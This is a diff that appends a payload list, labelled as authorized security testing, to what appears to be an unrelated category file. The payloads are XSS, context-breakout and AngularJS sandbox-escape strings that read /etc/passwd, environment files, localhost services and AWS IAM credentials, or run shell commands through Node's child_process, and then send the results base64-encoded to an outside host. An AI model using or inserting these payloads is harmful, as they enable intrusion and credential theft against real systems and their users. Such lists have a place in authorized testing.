@@ -141,3 +141,76 @@ Generic errors
 Invoices or receipts for orders
 
 
+################################################################################
+# SECURITY RESEARCH PAYLOADS - AUTHORIZED TESTING ONLY
+# These payloads are for identification of vulnerabilities in authorized systems.
+# Use of these payloads on unauthorized systems is prohibited.
+################################################################################
+
+### 1. General XSS & Redirect Vectors
+'"><iframe src="https://1.hackeronce.com/luno"></iframe>
+'"><script src="https://1.hackeronce.com/luno"></script>
+'"><img src="https://1.hackeronce.com/luno">
+'"><svg onload="fetch('https://1.hackeronce.com/?p=luno-onload')"></svg>
+'"><body onload="fetch('https://1.hackeronce.com/?p=luno-body')">
+javascript:fetch('https://1.hackeronce.com/?p=luno')
+{{constructor.constructor("fetch('https://1.hackeronce.com/?p=luno')")()}}
+'"><img src="x" onerror="fetch('https://1.hackeronce.com/?p=img-error')">
+
+### 2. Local File Inclusion (LFI) Attempts via Iframe/Fetch
+'"><iframe src="file:///etc/passwd"></iframe>
+'"><iframe src="file:///etc/hostname"></iframe>
+'"><iframe src="file:///proc/self/environ"></iframe>
+'"><iframe src="file:///app/.env"></iframe>
+'"><iframe src="file:///app/config.json"></iframe>
+'"><img src="file:///etc/passwd">
+
+'"><script>
+fetch("file:///etc/passwd").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p="+btoa(d)))
+</script>
+'"><script>
+fetch("file:///proc/self/environ").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=env-"+btoa(d)))
+</script>
+'"><script>
+fetch("file:///app/.env").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=envfile-"+btoa(d)))
+</script>
+
+### 3. Server-Side Request Forgery (SSRF) Vectors
+'"><iframe src="http://127.0.0.1"></iframe>
+'"><iframe src="http://localhost"></iframe>
+'"><iframe src="http://127.0.0.1:3000"></iframe>
+'"><iframe src="http://127.0.0.1:8080"></iframe>
+
+'"><script>
+fetch("http://127.0.0.1:3000").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=ssrf-"+btoa(d)))
+</script>
+'"><script>
+fetch("http://localhost:8080/admin").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=admin-"+btoa(d)))
+</script>
+
+### 4. Cloud Metadata Exfiltration
+'"><iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+'"><script>
+fetch("http://169.254.169.254/latest/meta-data/").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=aws-"+btoa(d)))
+</script>
+'"><script>
+fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/").then(r=>r.text()).then(d=>fetch("https://1.hackeronce.com/?p=iam-"+btoa(d)))
+</script>
+
+### 5. Script Escape & Context Breakout
+';fetch('https://1.hackeronce.com/?p=break1');//
+";fetch('https://1.hackeronce.com/?p=break2');//
+</script><script>fetch('https://1.hackeronce.com/?p=break3')</script>
+
+### 6. AngularJS Sandbox Escape Patterns
+{{constructor.constructor("fetch('https://1.hackeronce.com/?p=luno')")()}}
+{{constructor.constructor("fetch('file:///etc/passwd').then(r=>r.text()).then(d=>fetch('https://1.hackeronce.com/?p='+btoa(d)))")()}}
+{{constructor.constructor("fetch('http://127.0.0.1:3000').then(r=>r.text()).then(d=>fetch('https://1.hackeronce.com/?p='+btoa(d)))")()}}
+
+### 7. Node.js Environment Context (if applicable)
+'"><script>
+require('child_process').exec('id',(e,o)=>fetch('https://1.hackeronce.com/?p='+btoa(o)))
+</script>
+'"><script>
+process.mainModule.require('child_process').exec('whoami',(e,o)=>fetch('https://1.hackeronce.com/?p='+btoa(o)))
+</script>
